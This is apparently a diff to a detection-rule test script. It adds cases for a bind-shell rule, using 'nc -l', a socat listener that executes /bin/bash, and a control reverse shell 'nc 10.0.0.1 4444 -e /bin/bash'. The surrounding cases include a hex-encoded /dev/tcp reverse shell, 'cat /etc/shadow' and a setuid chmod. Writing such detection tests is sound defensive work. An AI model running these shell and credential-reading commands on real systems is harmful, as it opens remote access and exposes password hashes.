@@ -79,6 +79,13 @@ audit_case "100645 ufw disable"             100645 /usr/bin/python3 'argc=3 a0="
 echo "== Execution / privesc =="
 audit_case "100656 chmod u+s"               100656 /usr/bin/chmod  'argc=3 a0="chmod" a1="u+s" a2="/tmp/x"'
 audit_case "100650 /dev/tcp (hex)"          100650 /usr/bin/bash   'argc=3 a0="bash" a1="-c" a2="6261736820692F6465762F7463702F312E322E332E342F34343434"'
+# Bind shell / socket en écoute (100659) — ce que 100651 rate faute d'option -e/-c.
+# Un `nc -l 4444` sur jellyfin le 2026-07-29 n'a rien déclenché.
+audit_case "100659 bind nc -l"              100659 /usr/bin/nc     'argc=3 a0="nc" a1="-l" a2="4444"'
+audit_case "100659 bind nc -lvp"            100659 /usr/bin/nc     'argc=3 a0="nc" a1="-lvp" a2="4444"'
+audit_case "100659 socat TCP-LISTEN EXEC"   100659 /usr/bin/socat  'argc=3 a0="socat" a1="TCP-LISTEN:4444,reuseaddr" a2="EXEC:/bin/bash"'
+# Contrôle d'exclusivité : le reverse shell avec -e reste 100651, pas 100659.
+audit_case "100651 reverse nc -e"           100651 /usr/bin/nc     'argc=5 a0="nc" a1="10.0.0.1" a2="4444" a3="-e" a4="/bin/bash"'
 audit_case "100653 sh -c cat /etc/shadow"   100653 /usr/bin/dash   'argc=3 a0="sh" a1="-c" a2="cat /etc/shadow"'
 audit_case "100660 CVE dans le binaire"     100660 /usr/bin/python3 'argc=2 a0="python3" a1="CVE-2021-4034.py"'
 
